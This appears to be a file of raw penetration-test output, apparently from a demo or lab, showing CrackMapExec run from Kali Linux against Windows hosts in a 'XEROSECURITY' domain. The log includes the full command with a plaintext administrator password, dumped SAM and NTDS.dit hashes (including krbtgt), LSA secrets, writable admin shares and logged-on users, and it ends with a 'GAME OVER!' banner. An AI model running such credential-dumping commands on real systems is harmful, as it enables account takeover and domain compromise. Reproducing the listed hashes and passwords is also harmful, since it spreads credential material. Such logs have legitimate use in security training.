+02-01-2016 15:35:12 Administrator (500)/PrimaryGroupId: 513
+02-01-2016 15:35:12 Administrator (500)/BadPasswordCount: 0
+02-01-2016 15:35:12 Administrator (500)/LogonCount: 11
+02-01-2016 15:35:12 Guest (501)/FullName: 
+02-01-2016 15:35:12 Guest (501)/UserComment: 
+02-01-2016 15:35:12 Guest (501)/PrimaryGroupId: 513
+02-01-2016 15:35:12 Guest (501)/BadPasswordCount: 0
+02-01-2016 15:35:12 Guest (501)/LogonCount: 0
+02-01-2016 15:35:12 hacker (1005)/FullName: 
+02-01-2016 15:35:12 hacker (1005)/UserComment: 
+02-01-2016 15:35:12 hacker (1005)/PrimaryGroupId: 513
+02-01-2016 15:35:12 hacker (1005)/BadPasswordCount: 0
+02-01-2016 15:35:12 hacker (1005)/LogonCount: 0
+02-01-2016 15:35:12 HelpAssistant (1000)/FullName: Remote Desktop Help Assistant Account
+02-01-2016 15:35:12 HelpAssistant (1000)/UserComment: 
+02-01-2016 15:35:12 HelpAssistant (1000)/PrimaryGroupId: 513
+02-01-2016 15:35:12 HelpAssistant (1000)/BadPasswordCount: 0
+02-01-2016 15:35:12 HelpAssistant (1000)/LogonCount: 0
+02-01-2016 15:35:12 SUPPORT_388945a0 (1002)/FullName: CN=Microsoft Corporation,L=Redmond,S=Washington,C=US
+02-01-2016 15:35:12 SUPPORT_388945a0 (1002)/UserComment: 
+02-01-2016 15:35:12 SUPPORT_388945a0 (1002)/PrimaryGroupId: 513
+02-01-2016 15:35:12 SUPPORT_388945a0 (1002)/BadPasswordCount: 0
+02-01-2016 15:35:12 SUPPORT_388945a0 (1002)/LogonCount: 0
+02-01-2016 15:35:12 test (1003)/FullName: test
+02-01-2016 15:35:12 test (1003)/UserComment: 
+02-01-2016 15:35:12 test (1003)/PrimaryGroupId: 513
+02-01-2016 15:35:12 test (1003)/BadPasswordCount: 0
+02-01-2016 15:35:12 test (1003)/LogonCount: 16
+02-01-2016 15:35:12 test2 (1004)/FullName: 
+02-01-2016 15:35:12 test2 (1004)/UserComment: 
+02-01-2016 15:35:12 test2 (1004)/PrimaryGroupId: 513
+02-01-2016 15:35:12 test2 (1004)/BadPasswordCount: 0
+02-01-2016 15:35:12 test2 (1004)/LogonCount: 1
+02-01-2016 15:35:12 [+] 192.168.1.129:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
+02-01-2016 15:35:13 Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+02-01-2016 15:35:13 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+02-01-2016 15:35:13 HelpAssistant:1000:447873b78295638165d0a1a58736c426:c379debb205ae80e84bda1b3d430b6c8:::
+02-01-2016 15:35:13 SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:1534c54bed98875639d7e77ae9d51345:::
+02-01-2016 15:35:13 test:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+02-01-2016 15:35:13 test2:1004:e52cac67419a9a2217e4c3576fe93615:b490b475e987909ae9bd83a65aa94665:::
+02-01-2016 15:35:13 hacker:1005:e52cac67419a9a2217e4c3576fe93615:b490b475e987909ae9bd83a65aa94665:::
+02-01-2016 15:35:13 [+] 192.168.1.129:445 Dumping LSA secrets:
+02-01-2016 15:35:13 user:c158f3e72ab78ed2adb9d0fab0e1ec23:XEROSECURITY.COM:XEROSECURITY:::
+02-01-2016 15:35:13 Administrator:0620d5420b059bf1ead3532f9ec4ddff:XEROSECURITY.COM:XEROSECURITY:::
+02-01-2016 15:35:14 XEROSECURITY\TEST-3F6416AC49$:aad3b435b51404eeaad3b435b51404ee:a93c420761d5d783f1c3c674482e7d47:::
+02-01-2016 15:35:14 0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantAccount:720071002d003900460065007a00690070007200470061004a0074000000
+02-01-2016 15:35:14 0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantSID:010500000000000515000000828ba628f094c85f43170a32e8030000
+02-01-2016 15:35:14 DPAPI_SYSTEM:0100000084893622637e63afd446161a0249b443374fdd68233fd27564b784b541f19bbcbcda5a7e05693f8f
+02-01-2016 15:35:14 G${ED8F4747-E13D-47bc-856B-5CEFE1A81A7F}:2ee8a48cc675ba4aa2b32b037c32ebb7
+02-01-2016 15:35:14 L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75:5253413248000000000200003f00000001000100e9a52e38e90f138b941ebdece37e3c643c6a6f2f68d779d188ce16b354fdff897e3c27cb55f4b55d3cfd5ead25ae6ae86b0849c7032eb030ecccba3b69de73d90000000000000000b50fd99f804549ca0c1a06c0510d7a98f071fb6b02ac0ce137b7ec0a9a3faeec00000000e5d56aa025c0b721b75a59562bb913205eeb89e591b7ea2e07c7997a41d333eb000000001d3526e3eab3f2587cb983a996cf0db81ea63dc8af4542885727aa3d56ad3ec700000000b19f20775ef94b976969fc0757cc2d22d346009ea3dc74705442d046689805b800000000adb28e6b1633eccea3312962712e19ac5253e2bda457de521ad076a73da2122400000000214a49c8afe8d3a790fededa0545267b89d3ce1ecf616e87684b1aba11de847a38df5ec26a40e93f10c908b8e7516df724fbb60f33a0153fb010135b372ed1480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+02-01-2016 15:35:14 L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588:80090e78d173d101
+02-01-2016 15:35:15 L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}:2b23fd158334a16423fa09e1963b69715199ef947aa74374fd650844049df5c02c3f1f9ab280603ef3338dec1095434693d095b28b5f6690
+02-01-2016 15:35:15 NL$KM:8a70840d1b3283c55c58471ec992bfdb48318cf8c33fd3c883659b5e93fff6013fc6c3b044e0669582e66eab377dcc8e979b287f7733111805a102cadb0ba553
+02-01-2016 15:35:15 [+] 192.168.1.129:445 Dumping NTDS.dit secrets using the VSS method (domain\uid:rid:lmhash:nthash):
+02-01-2016 15:35:15 [+] 192.168.1.129:445 Current active sessions:
+02-01-2016 15:35:15 [+] 192.168.1.129:445 Available disks:
+02-01-2016 15:35:15 A:
+02-01-2016 15:35:15 C:
+02-01-2016 15:35:15 D:
+02-01-2016 15:35:15 [+] 192.168.1.129:445 Logged on users:
+02-01-2016 15:35:15 XEROSECURITY\TEST-3F6416AC49$  
+02-01-2016 15:35:15 XEROSECURITY\user WIN-8MSB2DD52P9 
+02-01-2016 15:35:15 TEST-3F6416AC49\test TEST-3F6416AC49 
+02-01-2016 15:35:15 XEROSECURITY\Administrator WIN-8MSB2DD52P9 
+02-01-2016 15:35:16 [-] 192.168.1.129:445 DCERPC Error: RRP SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.
+
+root@kali:/pentest/windows/CrackMapExec# python /pentest/windows/CrackMapExec/crackmapexec.py -u Administrator 
+-p Password123$ -d XEROSECURITY 192.168.1.138 --sam --lsa --ntds vss --shares --check-uac --sessions --disks --users --lusers
+ 
+02-01-2016 15:36:12 [*] 192.168.1.138:445 is running Windows 6.3 Build 9600 (name:WIN-8MSB2DD52P9) (domain:XEROSECURITY)
+02-01-2016 15:36:12 [+] 192.168.1.138:445 Login successful XEROSECURITY\Administrator:Password123$
+02-01-2016 15:36:12 [+] 192.168.1.138:445 Available shares:
+02-01-2016 15:36:12           SHARE     Permissions
+02-01-2016 15:36:12           -----     -----------
+02-01-2016 15:36:12               C       NO ACCESS
+02-01-2016 15:36:12          ADMIN$     READ, WRITE
+02-01-2016 15:36:12            IPC$            READ
+02-01-2016 15:36:12          SYSVOL            READ
+02-01-2016 15:36:12         Desktop     READ, WRITE
+02-01-2016 15:36:12        NETLOGON     READ, WRITE
+02-01-2016 15:36:12              C$     READ, WRITE
+02-01-2016 15:36:12 [+] 192.168.1.138:445 Dumping users:
+02-01-2016 15:36:12 Administrator (500)/FullName: 
+02-01-2016 15:36:12 Administrator (500)/UserComment: 
+02-01-2016 15:36:12 Administrator (500)/PrimaryGroupId: 513
+02-01-2016 15:36:12 Administrator (500)/BadPasswordCount: 0
+02-01-2016 15:36:12 Administrator (500)/LogonCount: 57
+02-01-2016 15:36:12 Guest (501)/FullName: 
+02-01-2016 15:36:12 Guest (501)/UserComment: 
+02-01-2016 15:36:12 Guest (501)/PrimaryGroupId: 514
+02-01-2016 15:36:12 Guest (501)/BadPasswordCount: 0
+02-01-2016 15:36:12 Guest (501)/LogonCount: 0
+02-01-2016 15:36:12 krbtgt (502)/FullName: 
+02-01-2016 15:36:12 krbtgt (502)/UserComment: 
+02-01-2016 15:36:12 krbtgt (502)/PrimaryGroupId: 513
+02-01-2016 15:36:12 krbtgt (502)/BadPasswordCount: 0
+02-01-2016 15:36:12 krbtgt (502)/LogonCount: 0
+02-01-2016 15:36:12 user (1106)/FullName: user
+02-01-2016 15:36:12 user (1106)/UserComment: 
+02-01-2016 15:36:12 user (1106)/PrimaryGroupId: 513
+02-01-2016 15:36:12 user (1106)/BadPasswordCount: 0
+02-01-2016 15:36:12 user (1106)/LogonCount: 5
+02-01-2016 15:36:12 test3 (1603)/FullName: 
+02-01-2016 15:36:12 test3 (1603)/UserComment: 
+02-01-2016 15:36:12 test3 (1603)/PrimaryGroupId: 513
+02-01-2016 15:36:12 test3 (1603)/BadPasswordCount: 0
+02-01-2016 15:36:12 test3 (1603)/LogonCount: 0
+02-01-2016 15:36:12 hacker (1604)/FullName: 
+02-01-2016 15:36:12 hacker (1604)/UserComment: 
+02-01-2016 15:36:12 hacker (1604)/PrimaryGroupId: 513
+02-01-2016 15:36:12 hacker (1604)/BadPasswordCount: 0
+02-01-2016 15:36:12 hacker (1604)/LogonCount: 0
+02-01-2016 15:36:12 [+] 192.168.1.138:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
+02-01-2016 15:36:12 Administrator:500:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665:::
+02-01-2016 15:36:12 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+02-01-2016 15:36:12 [+] 192.168.1.138:445 Dumping LSA secrets:
+02-01-2016 15:36:13 XEROSECURITY\WIN-8MSB2DD52P9$:aad3b435b51404eeaad3b435b51404ee:58171b080def3d75833dcc4588956059:::
+02-01-2016 15:36:13 XEROSECURITY\Administrator:Password123$
+02-01-2016 15:36:14 DPAPI_SYSTEM:010000003ebaec57217e3b64e2c8dbd2ac1a74b89e8556a09a7405a222ffee2e53537aa1c4a8ed162d1c0942
+02-01-2016 15:36:14 NL$KM:343d474a146294edb809595557fef61caa0aacf48e573c9f5c8a1244906a3c2125bc17d716f79fad4497e315a4d96d788c035e9e238087756a7c7c2b39854565
+02-01-2016 15:36:49 [+] 192.168.1.138:445 Dumping NTDS.dit secrets using the VSS method (domain\uid:rid:lmhash:nthash):
+02-01-2016 15:37:21 Administrator:500:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665:::
+02-01-2016 15:37:21 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+02-01-2016 15:37:21 WIN-8MSB2DD52P9$:1001:aad3b435b51404eeaad3b435b51404ee:58171b080def3d75833dcc4588956059:::
+02-01-2016 15:37:21 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b77d7cda13b836d669bea8ebbdb6464:::
+02-01-2016 15:37:22 user-XP$:1104:aad3b435b51404eeaad3b435b51404ee:9874f93eb39548c31e655bc688c89064:::
+02-01-2016 15:37:22 xerosecurity.com\user:1106:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665:::
+02-01-2016 15:37:22 TEST-3F6416AC49$:1602:aad3b435b51404eeaad3b435b51404ee:a93c420761d5d783f1c3c674482e7d47:::
+02-01-2016 15:37:22 test3:1603:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665:::
+02-01-2016 15:37:22 hacker:1604:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665:::
+02-01-2016 15:37:22 [+] 192.168.1.138:445 Current active sessions:
+02-01-2016 15:37:22 [+] 192.168.1.138:445 Available disks:
+02-01-2016 15:37:22 A:
+02-01-2016 15:37:22 C:
+02-01-2016 15:37:22 D:
+02-01-2016 15:37:22 [+] 192.168.1.138:445 Logged on users:
+02-01-2016 15:37:22 XEROSECURITY\WIN-8MSB2DD52P9$  
+02-01-2016 15:37:22 XEROSECURITY\WIN-8MSB2DD52P9$  
+02-01-2016 15:37:22 XEROSECURITY\Administrator WIN-8MSB2DD52P9 
+02-01-2016 15:37:22 XEROSECURITY\WIN-8MSB2DD52P9$  
+02-01-2016 15:37:22 XEROSECURITY\WIN-8MSB2DD52P9$  
+02-01-2016 15:37:22 XEROSECURITY\WIN-8MSB2DD52P9$  
+02-01-2016 15:37:22 XEROSECURITY\WIN-8MSB2DD52P9$  
+02-01-2016 15:37:22 XEROSECURITY\WIN-8MSB2DD52P9$  
+02-01-2016 15:37:22 XEROSECURITY\Administrator WIN-8MSB2DD52P9 
+02-01-2016 15:37:22 XEROSECURITY\WIN-8MSB2DD52P9$  
+02-01-2016 15:37:22 [+] 192.168.1.138:445 UAC status:
+02-01-2016 15:37:22 1 - UAC Enabled
+GAME OVER!
+                              ____
+                      __,-~~/~    `---.
+                    _/_,---(      ,    )
+                __ /        <    /   )  \___
+ - ------===;;;'====------------------===;;;===----- -  -
+                   \/  ~'~'~'~'~'~\~'~)~'/
+                   (_ (   \  (     >    \)
+                    \_( _ <         >_>'
+                       ~ `-i' ::>|--"
+                           I;|.|.|
+                          <|i::|i|`.
+                        (` ^''`-' ')
+ 
